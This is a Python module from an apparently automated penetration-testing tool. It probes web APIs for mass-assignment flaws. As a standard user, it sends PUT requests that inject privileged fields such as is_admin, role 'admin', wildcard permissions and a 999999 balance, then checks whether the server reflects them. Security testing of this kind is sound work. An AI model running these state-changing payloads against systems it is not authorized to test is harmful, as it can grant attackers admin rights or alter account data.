from typing import List, Dict, Any, Optional
from penflow.agents.capability_agent import BaseCapabilityAgent
from penflow.capabilities.capability import Capability
from penflow.capabilities.execution_context import CapabilityExecutionContext
from penflow.traffic.models import IdentityType
from penflow.infrastructure.logger import get_logger

logger = get_logger("penflow.agents.mass_assignment")

SENSITIVE_INJECTION_FIELDS = {
    "is_admin": True,
    "role": "admin",
    "admin": 1,
    "verified": True,
    "email_verified": True,
    "permissions": ["admin", "root", "*"],
    "balance": 999999,
    "tier": "enterprise"
}

class MassAssignmentCapabilityAgent(BaseCapabilityAgent):
    """
    Specialized Capability Agent for Mass Assignment and Auto-Binding Parameter Tampering.
    Injects privileged schema fields into state-changing HTTP requests.
    """
    def __init__(self, priority: int = 10):
        super().__init__(agent_name="MassAssignmentCapabilityAgent", priority=priority)

    def get_capabilities(self) -> List[Capability]:
        return [
            Capability(
                id="mass_assignment",
                name="Mass Assignment Vulnerability Check",
                description="Injects sensitive/privileged JSON fields into update and creation requests",
                priority=self.priority,
                tags=["mass_assignment", "parameter_tampering", "api"]
            ),
            Capability(
                id="parameter_tampering",
                name="JSON / Body Parameter Tampering",
                description="Tests auto-binding vulnerabilities in profile, account, and resource mutations",
                priority=self.priority,
                tags=["tampering", "api", "logic"]
            )
        ]

    async def execute(self, capability_id: str, context: CapabilityExecutionContext) -> Dict[str, Any]:
        logger.info(f"[MassAssignmentCapabilityAgent] Executing capability '{capability_id}' on asset '{context.asset}'")

        http_client = context.get_http_client()
        session_mgr = context.session_manager

        user_ident = session_mgr.get_identity_by_type(IdentityType.STANDARD_USER_A)
        if not user_ident:
            user_ident = session_mgr.create_identity("standard_tester", IdentityType.STANDARD_USER_A, bearer_token="penflow_test_token")

        candidate_urls = [f"https://{context.asset}/api/v1/user/update", f"https://{context.asset}/api/v1/profile"]

        findings: List[Dict[str, Any]] = []

        for target_url in candidate_urls:
            # Baseline payload
            baseline_payload = {"name": "PenFlow Tester", "bio": "Security Research"}
            # Injected payload
            injected_payload = dict(baseline_payload)
            injected_payload.update(SENSITIVE_INJECTION_FIELDS)

            # Test PATCH / PUT / POST
            exch = await http_client.send_as_identity(
                identity_id=user_ident.id,
                method="PUT",
                url=target_url,
                json_data=injected_payload
            )

            status = exch.response.status_code if exch.response else 0
            body_json = exch.response.body_json if (exch.response and exch.response.body_json) else {}

            is_vuln = False
            confidence = 0.0
            reflected_fields: List[str] = []

            # Check if any sensitive injected key was accepted and returned back in response
            if status in [200, 201] and isinstance(body_json, dict):
                for k in SENSITIVE_INJECTION_FIELDS.keys():
                    if k in body_json and body_json[k] == SENSITIVE_INJECTION_FIELDS[k]:
                        reflected_fields.append(k)

                if reflected_fields:
                    is_vuln = True
                    confidence = 0.94
                    reasoning = f"Mass assignment accepted! Privileged fields reflected in server response: {reflected_fields}"
                else:
                    reasoning = f"Request accepted with HTTP {status}, but sensitive fields were filtered or not reflected."
            else:
                reasoning = f"Server rejected parameter injection (HTTP {status})."

            findings.append({
                "target_url": target_url,
                "capability": capability_id,
                "is_vulnerable": is_vuln,
                "confidence_score": confidence,
                "reflected_fields": reflected_fields,
                "reasoning": reasoning,
                "evidence_exchange": exch.to_dict()
            })

        primary_finding = findings[0] if findings else {}

        return {
            "status": "COMPLETED",
            "agent": self.name,
            "capability": capability_id,
            "asset": context.asset,
            "is_vulnerable": primary_finding.get("is_vulnerable", False),
            "confidence_score": primary_finding.get("confidence_score", 0.0),
            "findings_count": len(findings),
            "evidence": primary_finding
        }
